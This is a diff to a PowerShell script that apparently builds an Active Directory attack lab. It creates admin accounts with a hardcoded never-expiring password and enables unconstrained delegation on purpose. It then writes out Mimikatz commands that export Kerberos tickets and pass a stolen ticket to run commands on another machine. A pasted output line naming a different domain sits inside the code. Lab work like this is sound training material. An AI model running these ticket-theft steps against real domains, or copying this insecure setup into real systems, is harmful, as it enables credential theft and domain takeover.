@@ -148,6 +148,54 @@ if (!([ADSI]::Exists("LDAP://CN=MailerAdmin,OU=ServiceAccounts,OU=Administrative
 # Need: action where admin user logs into the system
 # https://4sysops.com/archives/how-to-configure-computer-delegation-with-powershell/
 
+
+Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding LocalAdmin User for AdminPC1"
+if (!([ADSI]::Exists("LDAP://CN=LocalAdminPC1,OU=LocalAdminAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
+{
+	New-ADUser -Name "LocalAdminPC1" -DisplayName "LocalAdminPC1" -SamAccountName "localadminpc1" -UserPrincipalName "localadminpc1" -GivenName "localadminpc1" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "TestPassword123!" -AsPlainText -Force)) -Enabled $true -Path "OU=LocalAdminAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
+	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user LocalAdminPC1" 
+}else
+{
+	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user LocalAdminPC1 already exists. Moving On."
+}
+
+Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding LocalAdmin User for AdminPC2"
+if (!([ADSI]::Exists("LDAP://CN=LocalAdminPC2,OU=LocalAdminAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
+{
+	New-ADUser -Name "LocalAdminPC2" -DisplayName "LocalAdminPC2" -SamAccountName "localadminpc2" -UserPrincipalName "localadminpc2" -GivenName "localadminpc2" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "TestPassword123!" -AsPlainText -Force)) -Enabled $true -Path "OU=LocalAdminAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
+	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user LocalAdminPC2" 
+}else
+{
+	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user LocalAdminPC2 already exists. Moving On."
+}
+
+Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc1} -computername AdminPc.contoso.azure
+Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc1} -computername AdminPc.contoso.azure
+
+Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc2} -computername AdminPc.contoso.azure
+Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc2} -computername AdminPc.contoso.azure
+
+Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc2} -computername AdminPc2.contoso.azure
+Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc2} -computername AdminPc2.contoso.azure
+
+Get-ADComputer -Identity AdminPc | Set-ADAccountControl -TrustedForDelegation $True
+Get-ADComputer adminpc -Properties * | Format-List -Property *delegat*,msDS-AllowedToActOnBehalfOfOtherIdentity
+
+$SecPassword = ConvertTo-SecureString 'TestPassword123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\localadminpc2', $SecPassword)
+$s = New-PSSession -ComputerName AdminPc -Credential $Cred
+Invoke-Command –Session $s -ScriptBlock {whoami; hostname}
+
+# Connect to server and run mimikatz
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+* File: 'C:\Users\appadmin\Documents\user1\[0;6f5638a]-2-0-60a10000Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK 
+
+# Load Domain Admin ticket (TGT)
+Invoke-Mimikatz -Command '"kerberos::ptt [0;48b991]-2-0-60a10000-localadminpc2@krbtgt-CONTOSO.AZURE.kirbi"' 
+
+# Run commands
+Invoke-Command -ScriptBlock{whoami;hostname} -computername adminpc2
+
 ###########################################################################
 ### 8. Constrained Delegation
 ###########################################################################
